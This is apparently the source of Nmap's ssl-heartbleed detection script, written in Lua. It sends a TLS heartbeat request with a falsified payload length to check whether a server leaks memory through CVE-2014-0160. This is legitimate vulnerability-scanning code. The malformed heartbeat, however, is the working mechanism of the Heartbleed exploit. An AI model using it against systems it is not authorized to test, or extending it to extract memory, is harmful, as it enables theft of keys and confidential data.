local bin = require('bin')
local match = require('match')
local nmap = require('nmap')
local shortport = require('shortport')
local sslcert = require('sslcert')
local stdnse = require('stdnse')
local table = require('table')
local vulns = require('vulns')
local have_tls, tls = pcall(require,'tls')
assert(have_tls, "This script requires the tls.lua library from https://nmap.org/nsedoc/lib/tls.html")

description = [[
Detects whether a server is vulnerable to the OpenSSL Heartbleed bug (CVE-2014-0160).
The code is based on the Python script ssltest.py authored by Jared Stafford (jspenguin@jspenguin.org)
]]

---
-- @usage
-- nmap -p 443 --script ssl-heartbleed <target>
--
-- @output
-- PORT    STATE SERVICE
-- 443/tcp open  https
-- | ssl-heartbleed:
-- |   VULNERABLE:
-- |   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
-- |     State: VULNERABLE
-- |     Risk factor: High
-- |     Description:
-- |       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
-- |
-- |     References:
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
-- |       http://www.openssl.org/news/secadv_20140407.txt
-- |_      http://cvedetails.com/cve/2014-0160/
--
--
-- @args ssl-heartbleed.protocols (default tries all) TLS 1.0, TLS 1.1, or TLS 1.2
--

author = "Patrik Karlsson <patrik@cqure.net>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "vuln", "safe" }

local arg_protocols = stdnse.get_script_args(SCRIPT_NAME .. ".protocols") or {'TLSv1.0', 'TLSv1.1', 'TLSv1.2'}

portrule = function(host, port)
  return shortport.ssl(host, port) or sslcert.getPrepareTLSWithoutReconnect(port)
end

local function recvhdr(s)
  local status, hdr = s:receive_buf(match.numbytes(5), true)
  if not status then
    stdnse.debug3('Unexpected EOF receiving record header - server closed connection')
    return
  end
  local pos, typ, ver, ln = bin.unpack('>CSS', hdr)
  return status, typ, ver, ln
end

local function recvmsg(s, len)
  local status, pay = s:receive_buf(match.numbytes(len), true)
  if not status then
    stdnse.debug3('Unexpected EOF receiving record payload - server closed connection')
    return
  end
  return true, pay
end

local function testversion(host, port, version)

  local hello = tls.client_hello({
      ["protocol"] = version,
      -- Claim to support every cipher
      -- Doesn't work with IIS, but IIS isn't vulnerable
      ["ciphers"] = stdnse.keys(tls.CIPHERS),
      ["compressors"] = {"NULL"},
      ["extensions"] = {
        -- Claim to support every elliptic curve
        ["elliptic_curves"] = tls.EXTENSION_HELPERS["elliptic_curves"](stdnse.keys(tls.ELLIPTIC_CURVES)),
        -- Claim to support every EC point format
        ["ec_point_formats"] = tls.EXTENSION_HELPERS["ec_point_formats"](stdnse.keys(tls.EC_POINT_FORMATS)),
        ["heartbeat"] = "\x01", -- peer_not_allowed_to_send
      },
    })

  local payload = "Nmap ssl-heartbleed"
  local hb = tls.record_write("heartbeat", version, bin.pack("C>SA",
      1, -- HeartbeatMessageType heartbeat_request
      0x4000, -- payload length (falsified)
      -- payload length is based on 4096 - 16 bytes padding - 8 bytes packet
      -- header + 1 to overflow
      payload -- less than payload length.
      )
    )

  local status, s, err
  local specialized = sslcert.getPrepareTLSWithoutReconnect(port)
  if specialized then
    status, s = specialized(host, port)
    if not status then
      stdnse.debug3("Connection to server failed: %s", s)
      return
    end
  else
    s = nmap.new_socket()
    status, err = s:connect(host, port)
    if not status then
      stdnse.debug3("Connection to server failed: %s", err)
      return
    end
  end

  s:set_timeout(5000)

  -- Send Client Hello to the target server
  status, err = s:send(hello)
  if not status then
    stdnse.debug1("Couldn't send Client Hello: %s", err)
    s:close()
    return nil
  end

  -- Read response
  local done = false
  local supported = false
  local i = 1
  local response
  repeat
    status, response, err = tls.record_buffer(s, response, i)
    if err == "TIMEOUT" then
      -- Timed out while waiting for server_hello_done
      -- Could be client certificate required or other message required
      -- Let's just drop out and try sending the heartbeat anyway.
      done = true
      break
    elseif not status then
      stdnse.debug1("Couldn't receive: %s", err)
      s:close()
      return nil
    end

    local record
    i, record = tls.record_read(response, i)
    if record == nil then
      stdnse.debug1("Unknown response from server")
      s:close()
      return nil
    elseif record.protocol ~= version then
      stdnse.debug1("Protocol version mismatch")
      s:close()
      return nil
    end

    if record.type == "handshake" then
      for _, body in ipairs(record.body) do
        if body.type == "server_hello" then
          if body.extensions and body.extensions["heartbeat"] == "\x01" then
            supported = true
          end
        elseif body.type == "server_hello_done" then
          stdnse.debug1("we're done!")
          done = true
        end
      end
    end
  until done
  if not supported then
    stdnse.debug1("Server does not support TLS Heartbeat Requests.")
    s:close()
    return nil
  end

  status, err = s:send(hb)
  if not status then
    stdnse.debug1("Couldn't send heartbeat request: %s", err)
    s:close()
    return nil
  end
  while(true) do
    local status, typ, ver, len = recvhdr(s)
    if not status then
      stdnse.debug1('No heartbeat response received, server likely not vulnerable')
      break
    end
    if typ == 24 then
      local pay
      status, pay = recvmsg(s, 0x0fe9)
      s:close()
      if #pay > 3 then
        return true
      else
        stdnse.debug1('Server processed malformed heartbeat, but did not return any extra data.')
        break
      end
    elseif typ == 21 then
      stdnse.debug1('Server returned error, likely not vulnerable')
      break
    end
  end

end

action = function(host, port)
  local vuln_table = {
    title = "The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    description = [[
OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
    ]],

    references = {
      'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160',
      'http://www.openssl.org/news/secadv_20140407.txt ',
      'http://cvedetails.com/cve/2014-0160/'
    }
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  local test_vers = arg_protocols

  if type(test_vers) == 'string' then
    test_vers = { test_vers }
  end

  for _, ver in ipairs(test_vers) do
    if nil == tls.PROTOCOLS[ver] then
      return "\n  Unsupported protocol version: " .. ver
    end
    local status = testversion(host, port, ver)
    if ( status ) then
      vuln_table.state = vulns.STATE.VULN
      break
    end
  end

  return report:make_output(vuln_table)
end
